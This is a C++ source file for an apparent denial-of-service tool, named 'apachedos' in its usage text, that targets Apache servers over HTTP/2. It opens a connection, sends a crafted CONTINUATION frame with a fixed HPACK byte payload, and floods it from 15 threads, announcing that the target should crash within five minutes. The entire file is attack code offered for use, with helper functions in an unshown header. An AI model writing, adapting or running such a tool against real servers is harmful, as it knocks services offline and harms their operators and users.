#include "hdr.h"

int main(int argc, char* argv[]) {
    if (argc != 3) {
        cout << "Usage:" << endl << "apachedos [target] [port]" << endl;
        return 1;
    }

    SOCKET sock = connect_host(argv[1], argv[2]);

    if (sock == -1) {
        cout << "Error starting Winsock." << endl;
    }
    else if (sock == -2) {
        cout << "The target could not be found." << endl;
    }
    else if (sock == -3) {
        cout << "Error connecting to target" << endl;
    }
    else if (sock == -4) {
        cout << "Error connecting to target" << endl;
    }

    http2_stream continuation;
    continuation.len = 10;
    continuation.type = 9;
    continuation.flags = 0;
    continuation.st_id = 0x03000000;

    http2_initial(sock);

    char payload[20];
    memcpy(payload, &continuation, 9);
    memcpy(&payload[9], "\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76", 10);

    vector<thread> workers;
    for (int i = 0; i < 15; i++) {
        workers.push_back(thread(worker, sock, payload, 19));
    }

    cout << "Started the attack. It should take up to 5 minutes for the target to crash.\r";

    while (1) {
        Sleep(1000);
    }

    return 1;
}